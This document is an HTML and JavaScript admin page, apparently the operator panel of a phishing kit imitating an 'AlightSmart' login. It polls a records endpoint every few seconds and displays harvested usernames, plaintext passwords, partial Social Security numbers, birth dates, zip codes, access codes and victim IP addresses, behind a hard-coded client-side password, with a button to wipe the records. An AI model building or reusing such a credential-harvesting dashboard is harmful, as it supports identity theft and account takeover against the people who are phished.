<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AlightSmart Admin</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', sans-serif; background: #f8fafc; padding: 20px; }
        .container { max-width: 1600px; margin: auto; background: white; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); }
        .header { background: #1e40af; color: white; padding: 25px; text-align: center; }
        table { width: 100%; border-collapse: collapse; }
        th, td { padding: 14px; text-align: left; border-bottom: 1px solid #ddd; }
        th { background: #e2e8f0; }
        button { padding: 12px 25px; margin: 10px; border: none; border-radius: 8px; cursor: pointer; }
        .refresh-btn { background: #3b82f6; color: white; }
        .clear-btn { background: #ef4444; color: white; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔐 AlightSmart Admin Dashboard</h1>
            <p>Password: tunde6035</p>
        </div>

        <table id="recordsTable">
            <thead>
                <tr>
                    <th>Time</th>
                    <th>Username</th>
                    <th>Password</th>
                    <th>SSN (Last 4)</th>
                    <th>Birth Date</th>
                    <th>Zip Code</th>
                    <th>Access Code</th>
                    <th>IP</th>
                </tr>
            </thead>
            <tbody></tbody>
        </table>

        <div style="text-align: center; padding: 20px;">
            <button class="refresh-btn" onclick="loadRecords()">🔄 Refresh Now</button>
            <button class="clear-btn" onclick="clearRecords()">🗑️ Clear All Records</button>
        </div>
    </div>

    <script>
        const ADMIN_PASSWORD = "tunde6035";

        async function loadRecords() {
            const res = await fetch('/api/records');
            const records = await res.json();
            const tbody = document.querySelector('#recordsTable tbody');
            tbody.innerHTML = "";

            records.forEach(r => {
                tbody.innerHTML += `
                    <tr>
                        <td>${r.timestamp}</td>
                        <td><strong>${r.username || '-'}</strong></td>
                        <td><code>${r.password || '-'}</code></td>
                        <td>${r.address ? r.address.split('|')[0] : '-'}</td>
                        <td>${r.address ? r.address.split('|')[1] : '-'}</td>
                        <td>${r.address ? r.address.split('|')[2] : '-'}</td>
                        <td>${r.address ? r.address.split('|')[3] : '-'}</td>
                        <td>${r.ip || '-'}</td>
                    </tr>`;
            });
        }

        window.onload = () => {
            const pass = prompt("Enter Admin Password:");
            if (pass === ADMIN_PASSWORD) {
                loadRecords();
                setInterval(loadRecords, 4000);
            } else {
                alert("❌ Wrong Password");
                window.location.href = "/";
            }
        };

        async function clearRecords() {
            if (confirm("Clear ALL records?")) {
                await fetch('/api/clear', { method: 'POST' });
                loadRecords();
            }
        }
    </script>
</body>
</html>
